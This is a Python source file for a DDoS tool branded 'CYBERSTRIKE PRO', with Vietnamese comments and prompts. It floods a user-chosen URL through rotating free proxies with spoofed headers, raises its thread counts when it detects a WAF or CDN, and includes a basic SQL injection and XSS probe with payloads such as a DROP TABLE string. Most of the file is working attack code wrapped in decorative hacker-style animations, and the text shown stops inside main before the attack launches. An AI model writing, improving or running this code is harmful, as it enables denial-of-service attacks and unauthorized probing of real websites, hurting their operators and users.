#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
import whois
import dns.resolver
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint

# Khởi tạo console với theme màu
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "extra": "bold white",
    "blue": "bold blue",
    "dimmed": "dim magenta",
    "purple": "bold purple",
    "dim_cyan": "dim cyan",
    "yellow": "bold yellow"
})
console = Console(theme=custom_theme)

# Hiệu ứng ma trận 3D
def matrix_effect():
    characters = "01#+-*/=<>@$%&*|\\/"
    for _ in range(5):
        lines = []
        for _ in range(10):
            indent = " " * random.randint(0, 5)
            line = "".join(random.choice(characters) for _ in range(50))
            if random.random() < 0.2:
                line = line[:20] + "|" + line[21:]
            lines.append(indent + line)
        for i, line in enumerate(lines):
            color = random.choice(["bold green", "dim green"]) if i < 7 else "dim green"
            console.print(f"[{color}]{line}[/]")
            time.sleep(0.04)
        console.clear()
    console.print("[success]HỆ THỐNG: Ma trận khởi động hoàn tất! [success][✓][/] [bold yellow]*WHOOSH*[/]")

# Tùy chọn giao diện màu
def select_theme():
    colors = ["cyan", "magenta", "green", "blue", "white", "purple", "yellow"]
    console.print("[dim magenta]┤\n┌──(quangbao㉿attack)-[~]\n└─$ [bold cyan]Chọn giao diện màu:[/]\n├[/]")
    for color in colors:
        console.print(f"[bold {color}]  - {color.capitalize()} ███[/]")
        time.sleep(0.05)
    choice = Prompt.ask(
        "[dim magenta]┤\n┌──(quangbao㉿attack)-[~]\n└─$ [bold cyan]Nhập màu (cyan/magenta/green/blue/white/purple/yellow):[/]\n├[/] ",
        choices=colors, default="cyan"
    )
    console.print(f"[success]HỆ THỐNG: Đã chọn giao diện [bold {choice}]{choice.capitalize()}[/] [success][✓][/]")
    return choice

# Banner ASCII động kiểu phi thuyền 3D
def display_ascii_banner(theme_color):
    frames = [
        f"""
[{theme_color}]  ###++()))////#_-+=*|\\/   [/]
[{theme_color}]  # CYBERSTRIKE PRO #     [/]
[{theme_color}]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [⚡] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold magenta]     ###++()))////#_-+=*|\\/[/]
[bold magenta]   # CYBERSTRIKE PRO #    [/]
[bold magenta]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [★] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold green]  ###++()))////#_-+=*|\\/   [/]
[bold green]  # CYBERSTRIKE PRO #     [/]
[bold green]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [☆] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[bold yellow]   # CYBERSTRIKE PRO #    [/]
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [⚡] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold red]  ###++()))////#_-+=*|\\/   [/]
[bold red]  # CYBERSTRIKE PRO #     [/]
[bold red]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [★] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold white]     ###++()))////#_-+=*|\\/[/]
[bold white]   # CYBERSTRIKE PRO #    [/]
[bold white]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [☆] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold blue]  ###++()))////#_-+=*|\\/   [/]
[bold blue]  # CYBERSTRIKE PRO #     [/]
[bold blue]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [⚡] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[dim magenta]     ###++()))////#_-+=*|\\/[/]
[dim magenta]   # CYBERSTRIKE PRO #    [/]
[dim magenta]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [★] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold purple]  ###++()))////#_-+=*|\\/   [/]
[bold purple]  # CYBERSTRIKE PRO #     [/]
[bold purple]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [☆] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[dim cyan]     ###++()))////#_-+=*|\\/[/]
[dim cyan]   # CYBERSTRIKE PRO #    [/]
[dim cyan]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [⚡] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold yellow]  ###++()))////#_-+=*|\\/   [/]
[bold yellow]  # CYBERSTRIKE PRO #     [/]
[bold yellow]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [★] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[dim cyan]     ###++()))////#_-+=*|\\/[/]
[dim cyan]   # CYBERSTRIKE PRO #    [/]
[dim cyan]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [☆] Scanning...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """
    ]
    for _ in range(2):
        for frame in frames:
            console.clear()
            console.print(frame)
            time.sleep(0.15)
    console.clear()

# Hiệu ứng radar quét mục tiêu
def display_radar_effect(theme_color):
    frames = [
        f"[{theme_color}]~^~###++()))////#_-+=*|\\/ [⚡ QUÉT MỤC TIÊU ⚡] ###++()))////#_-+=*|\\/~^~[/] ◢",
        f"[bold magenta]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◣",
        f"[bold green]~^~###++()))////#_-+=*|\\/ [★ QUÉT MỤC TIÊU ★] ###++()))////#_-+=*|\\/~^~[/] ◤",
        f"[bold yellow]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◥",
        f"[bold red]~^~###++()))////#_-+=*|\\/ [⚡ QUÉT MỤC TIÊU ⚡] ###++()))////#_-+=*|\\/~^~[/] ◢",
        f"[bold white]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◣",
        f"[bold blue]~^~###++()))////#_-+=*|\\/ [★ QUÉT MỤC TIÊU ★] ###++()))////#_-+=*|\\/~^~[/] ◤",
        f"[dim magenta]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◥",
        f"[bold purple]~^~###++()))////#_-+=*|\\/ [⚡ QUÉT MỤC TIÊU ⚡] ###++()))////#_-+=*|\\/~^~[/] ◢",
        f"[dim cyan]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◣",
        f"[bold yellow]~^~###++()))////#_-+=*|\\/ [★ QUÉT MỤC TIÊU ★] ###++()))////#_-+=*|\\/~^~[/] ◤",
        f"[dim cyan]###++()))////#_-+=*|\\/~^~ [QUÉT MỤC TIÊU] ~^~###++()))////#_-+=*|\\/[/] ◥"
    ]
    for i, frame in enumerate(frames):
        console.clear()
        console.print(frame)
        console.print(f"[bold {theme_color} on magenta]ĐANG QUÉT... [{i+1}/{len(frames)}][/] [bold yellow]*LASER*[/]")
        time.sleep(0.1)
    console.clear()

# ASCII art khi thoát chương trình
def display_exit_banner(theme_color):
    frames = [
        f"""
[{theme_color}]  ###++()))////#_-+=*|\\/   [/]
[{theme_color}]  # TẠM BIỆT HACKER #     [/]
[{theme_color}]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [⚡] Exiting...       [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold magenta]     ###++()))////#_-+=*|\\/[/]
[bold magenta]   # TẠM BIỆT HACKER #    [/]
[bold magenta]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [★] Exiting... ...   [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold green]  ###++()))////#_-+=*|\\/   [/]
[bold green]  # TẠM BIỆT HACKER #     [/]
[bold green]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [☆] Exiting... ...   [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[bold yellow]   # TẠM BIỆT HACKER #    [/]
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [⚡] Exiting... ...   [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold red]  ###++()))////#_-+=*|\\/   [/]
[bold red]  # TẠM BIỆT HACKER #     [/]
[bold red]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [★] Exiting... ....  [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold white]     ###++()))////#_-+=*|\\/[/]
[bold white]   # TẠM BIỆT HACKER #    [/]
[bold white]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [☆] Exiting... ....  [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold purple]  ###++()))////#_-+=*|\\/   [/]
[bold purple]  # TẠM BIỆT HACKER #     [/]
[bold purple]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [⚡] Exiting... ....  [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[bold yellow]   # TẠM BIỆT HACKER #    [/]
[bold yellow]     ###++()))////#_-+=*|\\/[/]
[{theme_color}]    [★] Exiting... ..... [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """,
        f"""
[dim cyan]  ###++()))////#_-+=*|\\/   [/]
[dim cyan]  # TẠM BIỆT HACKER #     [/]
[dim cyan]  ###++()))////#_-+=*|\\/   [/]
[bold magenta]    [☆] Exiting... ..... [/]
[bold yellow]©2025 Quang Bao - DDos Attack[/]
        """
    ]
    for frame in frames:
        console.clear()
        console.print(frame)
        time.sleep(0.15)
    console.clear()

# Kiểm tra proxy
async def test_proxy(proxy, timeout=7):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=timeout) as response:
                if response.status == 200:
                    return True
    except Exception:
        return False
    return False

# Lấy proxy từ API miễn phí
async def fetch_proxies():
    global PROXY_LIST
    if len(PROXY_LIST) >= 3:
        console.print("[info]HỆ THỐNG: Sử dụng proxy từ PROXY_LIST hiện tại [success][✓][/] [bold yellow]*PING*[/]")
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.proxifly.dev/free-proxy-list?format=json") as response:
                if response.status == 200:
                    data = await response.json()
                    PROXY_LIST = [f"http://{proxy['ip']}:{proxy['port']}" for proxy in data[:50]]
                    console.print(f"[info]HỆ THỐNG: Lấy được [bold {theme_color}]{len(PROXY_LIST)}[/] proxy từ Proxifly API [success][✓][/] [bold yellow]*PING*[/]")
    except Exception as e:
        console.print(f"[warning]HỆ THỐNG: Không thể lấy proxy từ API: [bold yellow]{str(e)}[/] [warning][⚠][/] [bold yellow]*HUM*[/]")

# Kiểm tra và lọc proxy hoạt động
async def filter_active_proxies(theme_color):
    global PROXY_LIST
    await fetch_proxies()
    active_proxies = []
    tasks = [test_proxy(proxy) for proxy in PROXY_LIST[:50]]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for proxy, result in zip(PROXY_LIST[:50], results):
        if result is True:
            active_proxies.append(proxy)
    PROXY_LIST = active_proxies
    console.print(f"[info]HỆ THỐNG: Lọc được [bold {theme_color}]{len(PROXY_LIST)}[/] proxy hoạt động [success][✓][/] [bold yellow]*PING*[/]")

# Dấu nhắc kiểu hacker
def hacker_prompt(message, default=None, theme_color="cyan"):
    console.clear()
    prompt_text = f"[dim magenta]┤\n┌──(quangbao㉿attack)-[~]\n└─$ [bold {theme_color}]{message}[/]\n[dim magenta]├[/]"
    return Prompt.ask(prompt_text, default=default)

# Kiểm tra khóa xác thực
def check_auth_key(theme_color):
    for _ in range(3):
        console.clear()
        console.print(f"[bold {theme_color}]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
        time.sleep(0.2)
        console.clear()
        console.print(f"[bold magenta]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold {theme_color}]BÌNH NGUYÊN VÔ TẬN...[/] [success][★][/]")
        time.sleep(0.2)
        console.clear()
        console.print(f"[bold green]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN...[/] [success][☆][/]")
        time.sleep(0.2)
    console.clear()
    key = hacker_prompt("Nhập key xác thực: ", theme_color=theme_color)
    if key != "baoddos":
        console.print("[error]LỖI: Key không đúng! Thoát chương trình. [error][✗][/] [bold yellow]*CRASH*[/]")
        exit(1)
    console.print("[success]XÁC THỰC: Key hợp lệ! Truy cập hệ thống. [success][✓][/] [bold yellow]*BEEP*[/]")

# Kiểm tra tính toàn vẹn tệp
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning]HỆ THỐNG: Tạo mã băm mới: [bold magenta]{file_hash}[/] [success][✓][/] [bold yellow]*PING*[/]")
            elif file_hash != EXPECTED_HASH:
                console.print(f"[error]LỖI NGHIÊM TRỌNG: Tệp bị thay đổi! Thoát. [bold red][✗][/] [bold yellow]*ALERT*[/]")
                exit(1)
    except Exception as e:
        console.print(f"[error]LỖI NGHIÊM TRỌNG: Kiểm tra tính toàn vẹn thất bại: [bold red]{str(e)}[/] [error][✗][/] [bold yellow]*ALERT*[/]")
        exit(1)

# Xóa màn hình
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Hiệu ứng tải
def loading_animation(message, duration, theme_color):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[bold {theme_color}]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[bold {theme_color}]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]! [✓][/] [bold yellow]*HUM*[/]")

# Danh sách User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Tạo header ngẫu nhiên
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }

# Danh sách proxy
PROXY_LIST = []
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Bộ đếm toàn cục
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Xác thực URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: [bold red]{e}[/]")

# Đánh giá mức độ bảo mật mục tiêu
def assess_target_security(url, theme_color):
    security_level = "TRUNG BÌNH"
    recommended_threads = 1000
    recommended_requests = 1000

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=7)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        domain_age = (datetime.now() - creation_date).days if creation_date else 0

        if cdn_waf_detected or rate_limit:
            security_level = "CAO"
            recommended_threads = 5000
            recommended_requests = 2000
        elif domain_age > 365:
            security_level = "TRUNG BÌNH"
            recommended_threads = 2000
            recommended_requests = 1000
        else:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 500

        console.print(f"[info]HỆ THỐNG: Đánh giá bảo mật: [bold magenta]{security_level}[/], Luồng: [bold {theme_color}]{recommended_threads:,}[/], Yêu cầu: [bold {theme_color}]{recommended_requests:,}[/] [success][✓][/] [bold yellow]*PING*[/]")
    except Exception as e:
        console.print(f"[warning]HỆ THỐNG: Không thể đánh giá bảo mật: [bold yellow]{str(e)}[/]. Sử dụng giá trị mặc định. [warning][⚠][/] [bold yellow]*HUM*[/]")

    return security_level, recommended_threads, recommended_requests

# Điều chỉnh luồng theo khả năng thiết bị
def adjust_threads_for_device(num_threads, num_requests):
    cpu_count = multiprocessing.cpu_count()
    max_threads = min(num_threads, cpu_count * 1000)
    max_requests = min(num_requests, 9999999)
    console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold {theme_color}]{max_threads:,}[/] luồng, [bold {theme_color}]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU. [success][✓][/] [bold yellow]*PING*[/]")
    return max_threads, max_requests

# Tấn công clog để làm nghẽn mục tiêu
def clog_attack(url, requests_per_thread, duration, progress, task, theme_color):
    global success_count, error_count, response_times
    session = requests.Session()
    start_time = time.time()
    max_retries = 7

    while time.time() - start_time < duration:
        retries = 0
        while retries < max_retries:
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                response = session.get(url, headers=headers, proxies=proxy, timeout=7)
                console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold {theme_color}]{response.status_code}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack [bold yellow]*ZAP*[/]")

                with manager:
                    success_count += 1
                    response_times.append((time.time() - start_time) * 1000)
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps_color = "bold green" if success_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {theme_color}]TẤN CÔNG CLOG[/] [success][✓][/] {'█' * (success_count // max(1, (success_count + error_count) // 10))} {'▒' * (error_count // max(1, (success_count + error_count) // 10))} RPS: [{rps_color}]{success_count / (time.time() - start_time):.1f}[/] Ping: [bold green]{ping_avg:.1f}ms[/] Tỷ lệ lỗi: [bold red]{error_rate:.1f}%[/] ©2025 Quang Bao")
                break
            except requests.exceptions.ReadTimeout as e:
                retries += 1
                if retries == max_retries:
                    with manager:
                        error_count += 1
                        error_rate = (error_count / max(1, success_count + error_count)) * 100
                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
                        rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                        progress.update(task, advance=1, description=f"[bold {theme_color}]TẤN CÔNG CLOG[/] [error][✗][/] {'█' * (success_count // max(1, (success_count + error_count) // 10))} {'▒' * (error_count // max(1, (success_count + error_count) // 10))} RPS: [{rps_color}]{error_count / (time.time() - start_time):.1f}[/] Ping: [bold green]{ping_avg:.1f}ms[/] Tỷ lệ lỗi: [bold red]{error_rate:.1f}%[/] ©2025 Quang Bao")
                    console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack [bold yellow]*CRASH*[/]")
                else:
                    console.print(f"[warning]CLOG ATTACK: Timeout, thử lại lần {retries + 1}... [warning][⚠][/] ©2025 Quang Bao - DDos Attack")
                    time.sleep(random.uniform(0.03, 0.4))
            except Exception as e:
                with manager:
                    error_count += 1
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {theme_color}]TẤN CÔNG CLOG[/] [error][✗][/] {'█' * (success_count // max(1, (success_count + error_count) // 10))} {'▒' * (error_count // max(1, (success_count + error_count) // 10))} RPS: [{rps_color}]{error_count / (time.time() - start_time):.1f}[/] Ping: [bold green]{ping_avg:.1f}ms[/] Tỷ lệ lỗi: [bold red]{error_rate:.1f}%[/] ©2025 Quang Bao")
                console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack [bold yellow]*CRASH*[/]")
                break
        time.sleep(random.uniform(0.00005, 0.0001))

# Quét lỗ hổng web nâng cao
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=7) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Potential SQL Injection with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Use prepared statements."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: SQL Injection scan failed: [bold yellow]{str(e)}[/] [warning][✗][/] [bold yellow]*CRASH*[/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=7) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Encode all output."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: XSS scan failed: [bold yellow]{str(e)}[/] [warning][✗][/] [bold yellow]*CRASH*[/]")

    return vulnerabilities

# Hiển thị báo cáo lỗ hổng
def display_vulnerability_report(vulnerabilities, theme_color):
    panel = Panel(
        "\n".join(
            f"[bold magenta]Loại:[/] {vuln['type']}\n"
            f"[bold yellow]Mức độ:[/] {vuln['severity']}\n"
            f"[bold cyan]Mô tả:[/] {vuln['description']}\n"
            f"[bold green]Khuyến nghị:[/] {vuln['recommendation']}\n"
            for vuln in vulnerabilities
        ) or "[success]VULN SCAN: Không phát hiện lỗ hổng! [✓][/] [bold yellow]*HUM*[/]",
        title=f"[bold {theme_color} on magenta]BÁO CÁO LỖ HỔNG BẢO MẬT[/]",
        style=f"{theme_color} on magenta"
    )
    console.print(panel)
    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ", theme_color=theme_color)

# Hiển thị menu chính
def display_menu(theme_color):
    console.clear()
    title = "CYBERSTRIKE PRO ©2025 Quang Bao - DDos Attack"
    for i in range(len(title) + 1):
        console.clear()
        console.print(f"[bold {theme_color}]{title[:i]}[/]")
        time.sleep(0.05)
    console.clear()
    menu_content = (
        f"[bold {theme_color}]1. TẤN CÔNG CLOG[/]\n"
        f"   - Tấn công làm nghẽn bằng yêu cầu tốc độ cao\n"
        f"   - Hỗ trợ tối đa 999,999 luồng, 9,999,999 yêu cầu\n"
        f"   - Sử dụng proxy xoay vòng\n"
        f"[bold {theme_color}]2. QUÉT LỖ HỔNG[/]\n"
        f"   - Quét lỗ hổng web (SQLi, XSS) trong ~5-10 giây\n"
        f"   - Báo cáo chi tiết với khuyến nghị bảo mật\n"
        f"[bold {theme_color}]3. THOÁT[/]\n"
        f"   - Thoát chương trình với hiệu ứng phi thuyền\n"
        f"[bold yellow]©2025 Quang Bao - DDos Attack[/]"
    )
    panel = Panel(
        menu_content,
        title=f"[bold {theme_color} on magenta]{title}[/]",
        style=f"{theme_color} on magenta"
    )
    console.print(panel)
    console.print("[success]HỆ THỐNG: Menu hiển thị! [success][✓][/] [bold yellow]*PULSE*[/]")

# Hàm chính
def main():
    global theme_color
    matrix_effect()
    theme_color = select_theme()
    display_ascii_banner(theme_color)
    check_file_integrity()
    check_auth_key(theme_color)
    multiprocessing.set_start_method('spawn')

    loop = asyncio.get_event_loop()
    loop.run_until_complete(filter_active_proxies(theme_color))

    while True:
        try:
            display_menu(theme_color)
            choice = hacker_prompt("Nhập lựa chọn (1-3): ", theme_color=theme_color)

            if choice == "3":
                console.print(f"[warning]HỆ THỐNG: Thoát chương trình [success][✓][/] [bold yellow]*HUM*[/]")
                display_exit_banner(theme_color)
                exit(0)

            display_radar_effect(theme_color)
            input_url = hacker_prompt("Nhập URL hoặc IP mục tiêu: ", theme_color=theme_color)
            if not input_url:
                console.print(f"[error]LỖI: URL/IP không được để trống! [error][✗][/] [bold yellow]*CRASH*[/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
                for _ in range(2):
                    console.clear()
                    panel = Panel(
                        f"""
[bold {theme_color}]URL/IP:[/] [bold green]{validated_url}[/]
[bold {theme_color}]Hostname:[/] [bold green]{host}[/]
[bold {theme_color}]Port:[/] [bold green]{port}[/]
[bold {theme_color}]Trạng thái:[/] [bold green]Đã khóa [✓][[/]
[bold {theme_color}]Proxy Hoạt động:[/] [bold green]{len(PROXY_LIST)}[/]
                        """,
                        title=f"[bold {theme_color} on magenta]THÔNG TIN MỤC TIÊU[/]",
                        style=f"{theme_color} on magenta"
                    )
                    console.print(panel)
                    time.sleep(0.2)
                    console.clear()
                    panel = Panel(
                        f"""
[bold magenta]URL/IP:[/] [bold green]{validated_url}[/]
[bold magenta]Hostname:[/] [bold green]{host}[/]
[bold magenta]Port:[/] [bold green]{port}[/]
[bold magenta]Trạng thái:[/] [bold green]Đã khóa [✓][[/]
[bold magenta]Proxy Hoạt động:[/] [bold green]{len(PROXY_LIST)}[/]
                        """,
                        title=f"[bold magenta on {theme_color}]THÔNG TIN MỤC TIÊU[/]",
                        style=f"magenta on {theme_color}"
                    )
                    console.print(panel)
                    time.sleep(0.2)
                console.clear()
                console.print(panel)
            except ValueError as e:
                console.print(f"[error]LỖI: {str(e)}! Vui lòng nhập lại URL/IP. [error][✗][/] [bold yellow]*CRASH*[/]")
                time.sleep(1)
                continue

            console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold {theme_color}]{validated_url}[/] [success][✓][/] [bold yellow]*BEEP*[/]")
            loading_animation("Khóa mục tiêu", 2, theme_color)

            if choice == "2":
                console.print(f"[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/] [bold yellow]*BEEP*[/]")
                loading_animation("Quét lỗ hổng web", 3, theme_color)
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities, theme_color)
                continue

            num_threads = None
            while num_threads is None:
                try:
                    num_threads = int(hacker_prompt("Nhập số luồng (1-999999, mặc định: 1000): ", default="1000", theme_color=theme_color))
                    if not (1 <= num_threads <= 999999):
                        raise ValueError("Số luồng phải từ 1 đến 999999")
                except ValueError:
                    console.print(f"[error]LỖI: Số luồng phải là số nguyên từ 1 đến 999999! [error][✗][/] [bold yellow]*CRASH*[/]")
                    time.sleep(1)

            requests_per_thread = None
            while requests_per_thread is None:
                try:
                    requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-9999999, mặc định: 1000): ", default="1000", theme_color=theme_color))
                    if not (1 <= requests_per_thread <= 9999999):
                        raise ValueError("Số yêu cầu phải từ 1 đến 9999999")
                except ValueError:
                    console.print(f"[error]LỖI: Số yêu cầu phải là số nguyên từ 1 đến 9999999! [error][✗][/] [bold yellow]*CRASH*[/]")
                    time.sleep(1)

            duration = None
            while duration is None:
                try:
                    duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 60): ", default="60", theme_color=theme_color))
                    if duration < 1:
                        raise ValueError("Thời gian phải lớn hơn 0")
                except ValueError:
                    console.print(f"[error]LỖI: Thời gian phải là số nguyên lớn hơn 0! [error][✗][/] [bold yellow]*CRASH*[/]")
                    time.sleep(1)

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

